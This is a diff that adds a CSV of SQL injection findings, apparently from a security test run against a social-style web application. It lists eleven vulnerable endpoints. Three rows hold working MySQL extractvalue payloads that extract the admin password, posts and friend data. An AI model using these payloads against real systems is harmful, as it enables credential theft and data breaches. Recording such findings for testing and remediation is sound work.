@@ -1,0 +1,12 @@
+run_id,endpoint,vulnerability,poc
+20260901-1516-0002,/profile?username=,SQL Injection,`'` — visible MySQL error
+20260901-1516-0002,/users?search=,SQL Injection,"`'` — visible MySQL error; `1' AND extractvalue(1,concat(0x7e,(SELECT password FROM Users LIMIT 0,1),0x7e))-- x` extracts admin password"
+20260901-1516-0002,/posts?search=,SQL Injection,"`'` — visible MySQL error; `1' AND extractvalue(1,concat(0x7e,(SELECT content FROM Posts LIMIT 0,1),0x7e))-- x` extracts post content"
+20260901-1516-0002,/friends?username=mr_robot&search=,SQL Injection,"`'` — visible MySQL error; `1' AND extractvalue(1,concat(0x7e,(SELECT username1 FROM Friends LIMIT 0,1),0x7e))-- x` extracts friend data"
+20260901-1516-0002,/direct_messages?username=,SQL Injection,`'` — HTTP 500 error
+20260901-1516-0002,/requests?origin=requests&username=,SQL Injection,`'` — HTTP 500 error
+20260901-1516-0002,/requests?origin=profile&username=,SQL Injection,`'` — HTTP 500 error
+20260901-1516-0002,/edit_post?id=,SQL Injection,`'` — HTTP 500 error
+20260901-1516-0002,/delete_post?id=,SQL Injection,`'` — HTTP 500 error
+20260901-1516-0002,POST /create_post (content),SQL Injection,`content='` — visible MySQL error
+20260901-1516-0002,POST /edit_post (content),SQL Injection,`content='&id=<post_id>` — visible MySQL error
